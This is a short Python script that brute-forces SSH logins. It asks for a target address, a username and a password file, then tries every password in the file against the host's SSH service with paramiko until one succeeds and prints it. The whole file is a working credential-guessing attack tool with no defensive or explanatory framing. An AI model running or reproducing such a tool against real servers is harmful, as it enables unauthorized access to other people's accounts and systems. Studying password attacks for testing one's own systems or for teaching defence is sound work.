import paramiko,sys,os,socket,termcolor
import time,threading

def ssh_connect(password,code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error:
        code = 2

    ssh.close()
    return code

host = input('[+] Target Address: ').strip()
username = input('[+] Ssh Username: ').strip()
input_file = input('[+] Password File: ').strip()
print('\n')


if os.path.exists(input_file) == False:
    print(termcolor.colored(f'[-] File {input_file} Not Exist' , 'red'))
    sys.exit(1)

with open(input_file,'r') as file:
    for line in file.readlines():
        password = line.strip()
        if not password:
            continue
        try:
            response = ssh_connect(password)
            if response == 0:
                print(termcolor.colored(f'[!!] Found Password: {password} For Account: {username}', 'green'))
                break
            elif response == 1:
                print(termcolor.colored(f'[-] Incorrect Password {password}' , 'red'))
            elif response == 2:
                print('[*] Cant Connect To Host ')
                sys.exit(1)
            elif response == 3:
                print(termcolor.colored('[*] Unknow Error - Skipping ', 'yellow'))
            else:
                pass
        except Exception as e:
            print(e)
            pass

